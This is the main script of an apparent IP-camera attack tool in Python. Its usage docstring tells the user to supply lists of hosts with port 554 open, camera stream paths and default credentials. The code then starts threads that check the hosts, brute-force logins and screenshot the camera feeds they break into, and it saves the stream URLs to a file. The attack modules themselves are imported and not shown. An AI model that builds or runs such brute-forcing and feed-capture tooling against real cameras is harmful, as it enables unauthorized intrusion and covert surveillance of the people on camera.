"""
You need to have:
0. Installed packages from requirements.txt, recommended to use pipenv or venv.

1. List of hosts with open 554 port (or other). Place it near core.py with 'hosts.txt' name.

2. List of directories to brute throught. It should be like: '/webcam', '/cam.cgi' and etc. Place near core.py with 'routes.txt' name.

3. List of credentials, that will be used to brute and get in. For example: 'admin:', 'root:admin', 'admin:12345' and etc. Place near core.py with 'credentials.txt' name.

Usage:
Run this file from your command line and wait. Screenshots will be appearing in /pics folder, and the full 'rtsp://' urls in 'result.txt'.
"""
from queue import Queue

import config
from modules import *


if __name__ == '__main__':
    config.create_bars()

    check_queue = Queue()
    brute_queue = Queue()
    screenshot_queue = Queue()

    for _ in range(config.CHECK_THREADS):
        check_worker = CheckerThread(check_queue, brute_queue)
        check_worker.setDaemon(True)
        check_worker.start()

    for _ in range(config.BRUTE_THREADS):
        brute_worker = BruteThread(brute_queue, screenshot_queue)
        brute_worker.setDaemon(True)
        brute_worker.start()

    for _ in range(config.SCREENSHOT_THREADS):
        screenshoot_worker = ScreenshotThread(screenshot_queue)
        screenshoot_worker.setDaemon(True)
        screenshoot_worker.start()

    with open('hosts.txt') as file:
        for line in file:
            check_queue.put(line.strip(' \t\n\r'))
    config.check_bar.total = check_queue.qsize()

    check_queue.join()
    config.check_bar.close()

    brute_queue.join()
    config.brute_bar.close()

    screenshot_queue.join()
    config.screenshot_bar.close()
